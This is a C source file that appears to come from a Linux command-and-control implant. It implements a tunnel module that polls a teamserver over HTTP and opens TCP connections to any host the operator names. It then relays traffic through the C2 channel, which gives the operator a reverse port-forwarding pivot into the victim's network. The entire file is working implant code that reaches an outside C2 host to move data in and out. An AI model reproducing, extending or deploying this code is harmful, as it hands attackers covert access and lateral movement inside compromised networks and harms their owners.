/**
 * tunnel.c - C2 tunnel client for Linux
 *
 * Provides reverse port forwarding through the C2 channel.
 * Implant opens a tunnel via the teamserver REST API,
 * then relays data between local sockets and the C2 tunnel endpoint.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "../../include/config.h"
#include "../../include/pivot.h"
#include "../../include/transport.h"
#include "../../include/base64.h"
#include "../../include/json.h"

#define TUNNEL_OP_OPEN  0
#define TUNNEL_OP_DATA  1
#define TUNNEL_OP_CLOSE 2
#define MAX_TUNNEL_CH   32
#define TUNNEL_BUF      65536
#define MAX_TUNNEL_QUEUE 1024

typedef struct {
    DWORD   channel_id;
    int     sock;
    int     active;
    pthread_t thread;
} TUNNEL_CHANNEL;

static TUNNEL_CHANNEL g_channels[MAX_TUNNEL_CH];
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;
static int g_initialized = 0;
static PIMPLANT_CONFIG g_cfg = NULL;

static char g_out_json[TUNNEL_BUF];
static DWORD g_out_json_len = 0;
static DWORD g_out_frame_count = 0;

static int json_step(int *pos, char *buf, int cap, int n) {
    if (n < 0 || *pos + n >= cap) return -1;
    *pos += n;
    return 0;
}

static int json_comma(int *pos, char *buf, int cap) {
    if (*pos + 1 >= cap) return -1;
    buf[(*pos)++] = ',';
    return 0;
}

static int build_frame_json(char *buf, int cap, DWORD ch, int op, const char *b64,
                            const char *host, DWORD port) {
    int pos = 0;
    if (pos + 1 >= cap) return -1;
    buf[pos++] = '{';

    if (json_step(&pos, buf, cap, json_emit_kv_int(buf + pos, cap - pos, "channel_id", (int)ch)) < 0)
        return -1;
    if (json_comma(&pos, buf, cap) < 0) return -1;
    if (json_step(&pos, buf, cap, json_emit_kv_int(buf + pos, cap - pos, "op", op)) < 0)
        return -1;
    if (json_comma(&pos, buf, cap) < 0) return -1;
    if (json_step(&pos, buf, cap, json_emit_kv(buf + pos, cap - pos, "payload", b64 ? b64 : "")) < 0)
        return -1;

    if (host && host[0]) {
        if (json_comma(&pos, buf, cap) < 0) return -1;
        if (json_step(&pos, buf, cap, json_emit_kv(buf + pos, cap - pos, "target_host", host)) < 0)
            return -1;
        if (json_comma(&pos, buf, cap) < 0) return -1;
        if (json_step(&pos, buf, cap, json_emit_kv_int(buf + pos, cap - pos, "target_port", (int)port)) < 0)
            return -1;
    }

    if (pos + 1 >= cap) return -1;
    buf[pos++] = '}';
    buf[pos] = '\0';
    return pos;
}

static int build_tunnel_body(char *body, int cap, const char *session_id, const char *frames_json) {
    int pos = 0;
    if (pos + 1 >= cap) return -1;
    body[pos++] = '{';

    if (json_step(&pos, body, cap, json_emit_kv(body + pos, cap - pos, "session_id", session_id)) < 0)
        return -1;
    if (json_comma(&pos, body, cap) < 0) return -1;

    {
        char *frames_raw = (char *)malloc(TUNNEL_BUF + 16);
        if (!frames_raw) return -1;
        if (frames_json && frames_json[0]) {
            int fn = snprintf(frames_raw, TUNNEL_BUF + 16, "[%s]", frames_json);
            if (fn < 0 || fn >= TUNNEL_BUF + 16) { free(frames_raw); return -1; }
        } else {
            strcpy(frames_raw, "[]");
        }
        int step = json_emit_kv_raw(body + pos, cap - pos, "frames", frames_raw);
        free(frames_raw);
        if (json_step(&pos, body, cap, step) < 0)
            return -1;
    }

    if (pos + 1 >= cap) return -1;
    body[pos++] = '}';
    body[pos] = '\0';
    return pos;
}

static TUNNEL_CHANNEL *find_channel(DWORD id) {
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        if (g_channels[i].active && g_channels[i].channel_id == id)
            return &g_channels[i];
    }
    return NULL;
}

static TUNNEL_CHANNEL *alloc_channel(DWORD id) {
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        if (!g_channels[i].active) {
            memset(&g_channels[i], 0, sizeof(TUNNEL_CHANNEL));
            g_channels[i].channel_id = id;
            g_channels[i].sock = -1;
            g_channels[i].active = 1;
            return &g_channels[i];
        }
    }
    return NULL;
}

static void enqueue_out_frame(DWORD ch, int op, const BYTE *payload, DWORD plen,
                              const char *host, DWORD port) {
    pthread_mutex_lock(&g_lock);
    if (g_out_frame_count >= MAX_TUNNEL_QUEUE || g_out_json_len + 512 >= TUNNEL_BUF - 1) {
        pthread_mutex_unlock(&g_lock);
        return;
    }

    char b64[8192];
    b64[0] = '\0';
    if (payload && plen > 0 && plen < 6000)
        b64_encode(payload, plen, b64, sizeof(b64));

    char frag[1024];
    int n = build_frame_json(frag, sizeof(frag), ch, op, b64, host, port);
    if (n < 0) {
        pthread_mutex_unlock(&g_lock);
        return;
    }

    if (g_out_json_len == 0) {
        if ((DWORD)n >= sizeof(g_out_json)) {
            pthread_mutex_unlock(&g_lock);
            return;
        }
        memcpy(g_out_json, frag, (size_t)n);
        g_out_json[n] = '\0';
        g_out_json_len = (DWORD)n;
    } else {
        char *tmp = (char *)malloc(TUNNEL_BUF);
        if (!tmp) {
            pthread_mutex_unlock(&g_lock);
            return;
        }
        int tn = snprintf(tmp, TUNNEL_BUF, "%s,%s", g_out_json, frag);
        if (tn < 0 || tn >= (int)TUNNEL_BUF) {
            free(tmp);
            pthread_mutex_unlock(&g_lock);
            return;
        }
        strncpy(g_out_json, tmp, sizeof(g_out_json) - 1);
        g_out_json[sizeof(g_out_json) - 1] = '\0';
        g_out_json_len = (DWORD)strlen(g_out_json);
        free(tmp);
    }
    g_out_frame_count++;
    pthread_mutex_unlock(&g_lock);
}

static void *tunnel_relay_thread(void *param) {
    TUNNEL_CHANNEL *ch = (TUNNEL_CHANNEL *)param;
    BYTE buf[8192];

    while (ch->active && ch->sock >= 0) {
        ssize_t n = read(ch->sock, buf, sizeof(buf));
        if (n <= 0) {
            enqueue_out_frame(ch->channel_id, TUNNEL_OP_CLOSE, NULL, 0, NULL, 0);
            break;
        }
        enqueue_out_frame(ch->channel_id, TUNNEL_OP_DATA, buf, (DWORD)n, NULL, 0);
    }

    pthread_mutex_lock(&g_lock);
    if (ch->sock >= 0) {
        close(ch->sock);
        ch->sock = -1;
    }
    ch->active = 0;
    pthread_mutex_unlock(&g_lock);
    return NULL;
}

static int tunnel_open_channel(DWORD ch_id, const char *host, int port) {
    if (find_channel(ch_id))
        return 1;

    TUNNEL_CHANNEL *ch = alloc_channel(ch_id);
    if (!ch)
        return 0;

    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%d", port);

    struct addrinfo hints, *res = NULL, *rp;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port_str, &hints, &res) != 0) {
        ch->active = 0;
        return 0;
    }

    int s = -1;
    for (rp = res; rp; rp = rp->ai_next) {
        s = (int)socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (s < 0)
            continue;
        if (connect(s, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(s);
        s = -1;
    }
    freeaddrinfo(res);

    if (s < 0) {
        ch->active = 0;
        return 0;
    }

    ch->sock = s;
    if (pthread_create(&ch->thread, NULL, tunnel_relay_thread, ch) != 0) {
        close(s);
        ch->sock = -1;
        ch->active = 0;
        return 0;
    }
    pthread_detach(ch->thread);
    return 1;
}

static void tunnel_data(DWORD ch_id, const BYTE *data, DWORD len) {
    TUNNEL_CHANNEL *ch = find_channel(ch_id);
    if (!ch || ch->sock < 0)
        return;
    send(ch->sock, data, len, 0);
}

static void tunnel_close_channel(DWORD ch_id) {
    TUNNEL_CHANNEL *ch = find_channel(ch_id);
    if (!ch)
        return;
    pthread_mutex_lock(&g_lock);
    ch->active = 0;
    if (ch->sock >= 0) {
        close(ch->sock);
        ch->sock = -1;
    }
    pthread_mutex_unlock(&g_lock);
}

static void process_inbound_frames(const char *json) {
    const char *arr = strstr(json, "\"frames\":[");
    if (!arr)
        return;
    arr += 10;

    const char *p = arr;
    while (*p && *p != ']') {
        while (*p && *p != '{')
            p++;
        if (*p != '{')
            break;
        const char *end = strchr(p, '}');
        if (!end)
            break;

        char obj[4096];
        DWORD olen = (DWORD)(end - p + 1);
        if (olen >= sizeof(obj))
            olen = (DWORD)sizeof(obj) - 1;
        memcpy(obj, p, olen);
        obj[olen] = '\0';

        DWORD ch = json_find_uint(obj, "channel_id");
        int op = (int)json_find_uint(obj, "op");
        char host[256] = {0}, b64[8192] = {0};
        json_find_string(obj, "target_host", host, sizeof(host));
        DWORD port = json_find_uint(obj, "target_port");
        json_find_string(obj, "payload", b64, sizeof(b64));

        BYTE payload[8192];
        DWORD plen = 0;
        if (b64[0])
            plen = b64_decode(b64, (DWORD)strlen(b64), payload, sizeof(payload));

        switch (op) {
        case TUNNEL_OP_OPEN:
            if (!tunnel_open_channel(ch, host, (int)port))
                enqueue_out_frame(ch, TUNNEL_OP_CLOSE, NULL, 0, NULL, 0);
            else
                enqueue_out_frame(ch, TUNNEL_OP_DATA, NULL, 0, NULL, 0);
            break;
        case TUNNEL_OP_DATA:
            tunnel_data(ch, payload, plen);
            break;
        case TUNNEL_OP_CLOSE:
            tunnel_close_channel(ch);
            break;
        }
        p = end + 1;
    }
}

int tunnel_init(PIMPLANT_CONFIG config) {
    if (g_initialized)
        return 1;
    memset(g_channels, 0, sizeof(g_channels));
    g_out_json[0] = '\0';
    g_out_json_len = 0;
    g_out_frame_count = 0;
    g_cfg = config;
    g_initialized = 1;
    return 1;
}

void tunnel_cleanup(void) {
    if (!g_initialized)
        return;
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        if (g_channels[i].active)
            tunnel_close_channel(g_channels[i].channel_id);
    }
    g_initialized = 0;
}

int tunnel_poll(PIMPLANT_CONFIG config) {
    if (!g_initialized)
        tunnel_init(config);

    char *body = (char *)malloc(TUNNEL_BUF);
    char *frames_snapshot = (char *)malloc(TUNNEL_BUF);
    if (!body || !frames_snapshot) {
        free(body);
        free(frames_snapshot);
        return 0;
    }
    pthread_mutex_lock(&g_lock);
    if (g_out_json_len > 0) {
        if (g_out_json_len >= TUNNEL_BUF) {
            pthread_mutex_unlock(&g_lock);
            free(body);
            free(frames_snapshot);
            return 0;
        }
        memcpy(frames_snapshot, g_out_json, g_out_json_len);
        frames_snapshot[g_out_json_len] = '\0';
        g_out_json[0] = '\0';
        g_out_json_len = 0;
        g_out_frame_count = 0;
    } else {
        frames_snapshot[0] = '\0';
    }
    pthread_mutex_unlock(&g_lock);

    if (build_tunnel_body(body, TUNNEL_BUF, config->implant_id, frames_snapshot[0] ? frames_snapshot : NULL) < 0) {
        free(body);
        free(frames_snapshot);
        return 0;
    }

    if (!config->tunnel_path[0])
        strncpy(config->tunnel_path, C2_TUNNEL_PATH, sizeof(config->tunnel_path) - 1);

    PHTTP_RESPONSE resp = http_post(config->c2_url, config->tunnel_path,
                                    (BYTE *)body, (DWORD)strlen(body), config->user_agent);
    free(body);
    free(frames_snapshot);
    if (!resp || resp->status_code != 200) {
        if (resp)
            http_response_free(resp);
        return 0;
    }

    if (resp->data && resp->size > 0)
        process_inbound_frames((const char *)resp->data);

    http_response_free(resp);
    return 1;
}
